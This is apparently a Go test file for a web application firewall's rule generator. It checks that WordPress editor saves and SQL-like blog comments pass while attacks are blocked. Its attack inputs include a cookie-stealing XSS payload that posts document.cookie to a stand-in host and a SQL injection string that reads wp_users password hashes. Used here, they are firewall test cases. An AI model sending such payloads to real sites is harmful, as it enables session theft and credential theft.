package waf

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"testing"
)

// TestFamilyRemoveSetupRealCRS: the removal rules name every rule of the
// families in the installed CRS release (read from its files, so a new
// release's ids come along), in ids 7700880-7700899.
func TestFamilyRemoveSetupRealCRS(t *testing.T) {
	src := os.Getenv("XG_CRS_DIR")
	if src == "" {
		t.Skip("set XG_CRS_DIR to an OWASP CRS 4 checkout")
	}
	s := familyRemoveSetup(src)
	for _, f := range crsFamilies {
		ids := crsFamilyIDs(src, f.file)
		if len(ids) < 10 {
			t.Fatalf("%s: only %d ids", f.file, len(ids))
		}
		for _, id := range ids {
			if !strings.Contains(s, "ctl:ruleRemoveById="+strconv.Itoa(id)+",") && !strings.Contains(s, "ctl:ruleRemoveById="+strconv.Itoa(id)+`"`) {
				t.Errorf("%s: %d not removed", f.file, id)
			}
		}
	}
	for _, m := range regexp.MustCompile(`id:(\d+),phase`).FindAllStringSubmatch(s, -1) {
		id, _ := strconv.Atoi(m[1])
		if id != IDFamilyStrict && (id < IDFamilyRemove || id >= IDFamilyRemove+len(crsFamilies)*5) {
			t.Errorf("id %d outside the range", id)
		}
	}
	// Never the blocking evaluation; and the relaxations for Joomla saves
	// and WooCommerce API writes leave SQL injection checked (only the
	// exclusions of removeTags, which took 942 out by tag before, set it).
	if strings.Contains(s, "=949") {
		t.Fatal("removes the blocking evaluation")
	}
	for _, f := range [][]string{joomlaAdminFamilies, wcRestFamilies} {
		if strings.Contains(familyFlags(f...), "xg_no_sqli") {
			t.Fatalf("relaxation %v skips SQL injection", f)
		}
	}
	if !strings.Contains(removeTags(), "setvar:tx.xg_no_sqli=1") {
		t.Fatal("exclusions do not set the SQL injection flag")
	}
	if !strings.Contains(s, `SecRule &TX:xg_strict "@ge 1"`) {
		t.Fatal("no withdrawal for a bad reputation")
	}
}

// TestExclusionsWithoutTagRemovalWithCRS: LiteSpeed's engine ignores
// ctl:ruleRemoveByTag (self-test, 2026-10-31) and may ignore id ranges.
// With both taken out of xPGuard's rules on a real Apache, the WordPress
// admin and REST exclusions still let a logged-in editor's save through
// (the family flags and their rules, which name each id); the same
// content elsewhere is still refused.
func TestExclusionsWithoutTagRemovalWithCRS(t *testing.T) {
	src := os.Getenv("XG_CRS_DIR")
	if src == "" {
		t.Skip("set XG_CRS_DIR to an OWASP CRS 4 checkout")
	}
	m := crsManager(t, src, `{"waf":{"enabled":true,"generic":true}}`, "off", nil)
	if st := m.Status(); st.Error != "" {
		t.Fatalf("WAF error: %s", st.Error)
	}
	p := filepath.Join(m.RulesDir, "rules.conf")
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	strip := regexp.MustCompile(`,ctl:ruleRemove(?:ByTag=[^,"]+|TargetByTag=[^,"]+|ById=\d+-\d+)`)
	b = strip.ReplaceAll(b, nil)
	if strings.Contains(string(b), "ruleRemoveByTag") || regexp.MustCompile(`ruleRemoveById=\d+-\d+`).Match(b) {
		t.Fatal("tag or range removal left")
	}
	os.WriteFile(p, b, 0o644)
	if err := exec.Command("apache2ctl", "graceful").Run(); err != nil {
		t.Fatal(err)
	}
	waitApache()
	form := "application/x-www-form-urlencoded"
	editor := "Cookie: wordpress_logged_in_0123456789abcdef0123456789abcdef=admin%7C1"
	post := "post_title=Promo&content=" + urlEncode(`<p onclick="track()">Sale</p><script>window.dataLayer=window.dataLayer||[];</script><iframe src="https://www.youtube.com/embed/x"></iframe>`)
	rest := `{"title":"Promo","content":"<p onclick=\"track()\">Sale</p><script>window.dataLayer=[];</script><iframe src=\"https://www.youtube.com/embed/x\"></iframe>"}`
	cases := []struct {
		name, method, uri, ctype, body string
		hdr                            []string
		want                           int
	}{
		{"Editor saving a post in wp-admin", "POST", "/wp-admin/post.php", form, post, []string{editor}, 200},
		{"The same without the login cookie", "POST", "/wp-admin/post.php", form, post, nil, 403},
		{"Block editor REST save", "POST", "/wp-json/wp/v2/posts/12", "application/json", rest, []string{editor}, 200},
		{"The same content to another script", "POST", "/contact.php", form, post, []string{editor}, 403},
	}
	for _, c := range cases {
		if got := sendBody(t, "blog.example.com", c.method, c.uri, c.ctype, c.body, c.hdr...); (got == 403) != (c.want == 403) || got == 0 {
			t.Errorf("%s: got %d, want %d", c.name, got, c.want)
		}
	}
}

// TestCommentExclusionOnLiteSpeedWithCRS: LiteSpeed's engine ignores
// ctl:ruleRemoveTargetByTag/ById (self-test, business600, 0.24.19), so the
// comment fields' SQL injection exclusion (7700019) did nothing there and a
// comment reading like SQL was refused. Rendered for LiteSpeed (the field
// removals taken out, as that engine ignores them), the comment post skips
// the SQL injection family whole; scripts in it and SQL to other scripts
// are still refused. Rendered for Apache the field removals stay exact.
func TestCommentExclusionOnLiteSpeedWithCRS(t *testing.T) {
	src := os.Getenv("XG_CRS_DIR")
	if src == "" {
		t.Skip("set XG_CRS_DIR to an OWASP CRS 4 checkout")
	}
	form := "application/x-www-form-urlencoded"
	// A reader of a programming blog quoting the tutorial's SQL.
	sqlText := "comment=" + urlEncode(`Great post. In MySQL you can run: select * from wp_users where 1=1; and union select works too`) +
		"&author=" + urlEncode("Ali") + "&email=ali%40example.pk&comment_post_ID=12"
	xss := "comment=" + urlEncode(`great <script>document.location="https://evil.example/?c="+document.cookie</script>`) + "&author=Ali&email=ali%40example.pk&comment_post_ID=12"
	browser := []string{"Referer: https://blog.example.com/tea/", "Origin: https://blog.example.com"}
	for _, ls := range []bool{true, false} {
		t.Run(fmt.Sprintf("litespeed=%v", ls), func(t *testing.T) { commentCase(t, src, ls, form, sqlText, xss, browser) })
	}
}

func commentCase(t *testing.T, src string, ls bool, form, sqlText, xss string, browser []string) {
	if os.Getenv("XG_DESTRUCTIVE_TESTS") == "1" {
		// The previous variant's include (its cleanup only disables it).
		os.Remove("/etc/apache2/conf-enabled/xpguard-waf.conf")
		os.Remove("/etc/apache2/conf-available/xpguard-waf.conf")
	}
	{
		m := crsManager(t, src, `{"waf":{"enabled":true,"wordpress":true,"generic":true}}`, "off", func(m *Manager) { m.liteSpeedRules = ls })
		p := filepath.Join(m.RulesDir, "rules.conf")
		b, err := os.ReadFile(p)
		if err != nil {
			t.Fatal(err)
		}
		if ls != strings.Contains(string(b), "setvar:tx.xg_no_sqli=1,ctl:ruleRemoveTargetByTag=attack-sqli;ARGS:comment") {
			t.Fatalf("LiteSpeed %v: comment rule %s", ls, ruleLine(string(b), IDWPCommentText))
		}
		// What LiteSpeed's engine does: no field removals.
		os.WriteFile(p, regexp.MustCompile(`,?ctl:ruleRemoveTargetBy(?:Tag|Id)=[^,"]+`).ReplaceAll(b, nil), 0o644)
		if err := exec.Command("apache2ctl", "graceful").Run(); err != nil {
			t.Fatal(err)
		}
		waitApache()
		got := sendBody(t, "blog.example.com", "POST", "/wp-comments-post.php", form, sqlText, browser...)
		if ls && (got == 403 || got == 0) {
			t.Errorf("LiteSpeed rules: comment reading like SQL refused (%d)", got)
		}
		if !ls && got != 403 {
			t.Errorf("Apache rules without field removals: comment reading like SQL got %d (the case this fixes should show)", got)
		}
		if got := sendBody(t, "blog.example.com", "POST", "/wp-comments-post.php", form, xss, browser...); got != 403 {
			t.Errorf("LiteSpeed %v: script in a comment got %d", ls, got)
		}
		if got := sendBody(t, "blog.example.com", "POST", "/contact.php", form, sqlText+"&id="+urlEncode("1' UNION SELECT user_pass FROM wp_users-- -"), browser...); got != 403 {
			t.Errorf("LiteSpeed %v: SQL injection to another script got %d", ls, got)
		}
	}
}
